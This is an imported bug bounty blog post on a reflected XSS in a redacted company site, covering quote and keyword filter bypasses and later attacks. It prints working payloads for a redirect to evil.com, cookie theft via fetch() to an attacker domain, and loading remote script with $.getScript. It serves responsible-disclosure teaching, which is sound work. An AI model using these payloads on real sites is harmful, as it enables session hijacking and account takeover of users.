---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-09-05_xss-that-can-pay-your-bills-.md
original_filename: 2020-09-05_xss-that-can-pay-your-bills-.md
title: XSS that can pay your Bills :)
category: documents
detected_topics:
- xss
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: 1b7c336e85ee4d4f484dec4ee0841ac44ab516de6a228330e0779360383cac02
text_sha256: 2f0cf24af23506b78035ac2662f71e18eebf7ea6d767cd4d61dd9b0900a7782f
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# XSS that can pay your Bills :)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-09-05_xss-that-can-pay-your-bills-.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `1b7c336e85ee4d4f484dec4ee0841ac44ab516de6a228330e0779360383cac02`
- Text SHA256: `2f0cf24af23506b78035ac2662f71e18eebf7ea6d767cd4d61dd9b0900a7782f`


## Content

---
title: "XSS that can pay your Bills :)"
url: "https://medium.com/@smilehackerofficial/xss-that-can-pay-your-bills-9377eff1fd0d"
authors: ["Smile Hacker (@_smile_hacker_)"]
bugs: ["Reflected XSS"]
bounty: "500"
publication_date: "2020-09-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4278
scraped_via: "browseros"
---

# XSS that can pay your Bills :)

XSS that can pay your Bills :)
Meet Sodha
Follow
7 min read
·
Sep 6, 2020

454

2

Heya Peeps !!

This is the story of the XSS(Cross site Scripting) which will help you to pay your bills i.e will help you to making Good money. As well as how can you weaponize XSS for Post exploitation as well as some awesome bypasses.

So here we go !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press enter or click to view image in full size
Photo by Bernard Hermant on Unsplash

I usually hunt on responsible disclosure programs rather that bugbounty platforms so I found a program (Company) and First tim I reported the simple Reflected Cross site scripting (RXSS).

https://redacted.com/action=1&q=1&&tab=”-confirm(‘smilehacker’)-”

tab param was simply reflecting in javascript. On the third day after reporting of this XSS company rewarded me with 100 Euros so the response was pretty quick I decided to dig more and I reported 7 More XSS company Rewarded me with 700 Euros more.

Press enter or click to view image in full size
Photo by Sharon McCutcheon on Unsplash

All of the XSS were reflecting in JavaScript after some time I reported Some different Bugs and Company rewarded me pretty good. After getting rewards I spent nearly a month for finding more bugs But not succeeded.

No Bounty

I decided to check on my previously reported XSS For bypass of fixed XSS bugs. I started checking again and Bad Luck I can’t bypass those fixes But one of that isn’t fixed all of 7 were fixed. So I decided to Write a E-mail to company again and I did.

And Guess What ?? Company Replied Just See What they Said !!!!

Reply 1:

Reply 1

Reply 2:

Press enter or click to view image in full size
Reply 2

In the First Reply they Deny to pay bounty For bugs like XSS (Cross Site Scripting).They thought that XSS is not a really Critical issue.

Press enter or click to view image in full size
Photo by Jared Rice on Unsplash

And in the Second reply the XSS fires when the braces () are Empty. So I was wondering how I can show them the practical impact of the bugs that they thought aren’t that much critical. So I tried my best to escalate this one.I would Like to thanks my Really good friend Viren Pawar For Guiding throughout whole of this Exploitation.

1.Bypassing prohibited string Inputs

So, I know that ‘ (single quotes) and “ (double quotes) breaks the exploit to happen. Really very good approach to fix, but still not full-proof against attackers. First thing, javascript accepts multiple ways to take string input, they have blocked 2 of them, there is a third way of using string in Javascript that is by using template string literals and Back-tick '''''''''''''''`` .

Bypass payload 1: parent=confirm`smilehacker` (Just only string bypass)

2.{a}. Bypassing Document.cookie/document.domain

Beside, those quotes encoding, I have also bypassed the “document.cookie” filter (as if we write document.cokie it will simply print “Document.cookie in the popup”)the document.cookie filter has been bypassed using the latest Javascript ES2020 syntax (the new update of JavaScript)i.e. document?.cookie which will generally work in modern browsers.

Payload 2{a} : parent=confirm(document?.cookie) (Works in latest browsers)

2.{b}. Bypassing Document.cookie/document.domain(using template string literals)

You will be thinking that how it worked without ' or " .I have injected strings using backtick (`) which allows me to inject strings using template string literals available in Javascript.

payload 2.{b} : parent=confirm(this[`document`][`cookie`])

Get Meet Sodha’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

these are the simple and less-known bypasses of XSS I don’t know about you but when I did it First time it was Really Marvelous For me.

Let’s Run for the Post Exploitation of XSS.

3. Redirecting user to another page

https://www.redacted.com/path?parent=(location=`https://evil.com`)

In the above URL We all know that the Victim Will Redirected to any other site most probably Phishing site. But if you want to make it more interesting Just encode your payload in URL-encoding

For example:

https://www.readacted.com/path?parent=%28%6c%6f%63%61%74%69%6f%6e%3d%60%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%60%29

It’s all about pushing your Ideas and skills to another creative Level.

4. Sending user cookies to attacker website

https://www.redacted.com/path?parent=fetch(`https://xss-server.com/path/?p=`%252bbtoa(document?.cookie))
(Works in latest browsers)

Let's see what's happening over here. Instead of confirm() or any other dialog representing function, I have used fetch API of Javascript. This works same as Javascript AJAX, but this fetch() api is very compact. Learn more over here about fetch: https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API Coming to the exploitation, the first parameter is necessary for fetch API and that is the URL address at which the GET request has to be sent. For exploitation, I have added my domain over here and I am passing document's cookie in as parameter 'p' value.

One question? What is btoa()?

This function simply encodes given string using base64 encoding. So the issue of spaces and invalid characters, which are not allowed in GET is solved. So understanding till here, I have crafted a fetch api with my domain(attacker's domain) and paramter with user's cookie encoded. Upon execution of this, I will receive victim's cookie at my domain, at my end I am decoding this base64 string and getting the cookies in clear text. Looking further more in calculating cookie stealing impact, I know that site is running it’s system upon JSP, which uses JSESSIONID for session authentication, which means that logged-in users are acknowledged by the system using this cookie. Considering the scenario, if any logged-in user visits my above crafted payload, I will have his cookie over my server, using those cookie when I will visit companies domain, the domain will treat me as the client and at this moment, the impact of XSS has escalated from general pop-up to USER ACCOUNT TAKEOVER, moreover, for admin login I think that same cookies are being used, so it can also be classified to ADMIN ACCOUNT TAKEOVER via XSS, but have you noticed one thing that the cookie stealing shows no signs on the domain, everything is feeling normal, there's almost no visible clue to the user that his cookies are compromised, for verifying that things are happening in real-time, I have opened browser's developer tool to inspect network requests that are under action and away from user's eye. Great.Even I can url-encode the payload, which will make it undetectable to normal users.

5. Taking Screenshots of victim page and many more things.

https://www.redacted.com/path?parent=$.getScript(`//xsshunter.xss.ht`)

Okay, now I know that you all got to know about how critical XSS can be if advance exploitation is done.

Let’s Understand the Logic Behind this Payload.

While looking on this payload, let me first introduce what is this? jQuery has short-hand operator, which is $ (dollar sign), anything specified by jQuery.function() can be used by $.function(), so the first portion is jQuery library usage. The function I have used over here is getScript(), this function is really bliss for attackers, as this function will request javascript at mentioned URL and will automatically execute that script. So it will basically work like <script src="link/to/attaker.js"> which is also really dangerous and blocked, but the same is being executed using jQuery.getScript() . The URL entered inside is my subdomain which automates the exploitation. As being attacker, every time the XSS is fired I will get an email that XSS has been triggered, I will receive screenshot of user page, vulnerable page URL, user IP address, user agent, entire DOM which means HTML page which is being seen by victim.

After this one the Company was really Happy as they awarded me 100 Euros already but they Decided to award me additional 400 Euros for Proving Exploitation of this bug.

Final Reply

After Viewing this Reply I was Like Flying. I personally Do Like this Kind Of companies Who Put their Efforts towards to Security.

So Guys !! that’s all From my Side :)

I hope You Enjoyed this one I haven’t Created any of this. all of these I learned From Several Different Resources Thanks to all !!!

Connect With me :

https://twitter.com/_smile_hacker_

https://instagram.com/_smile_hacker_

Kind Regards,

Smilehacker
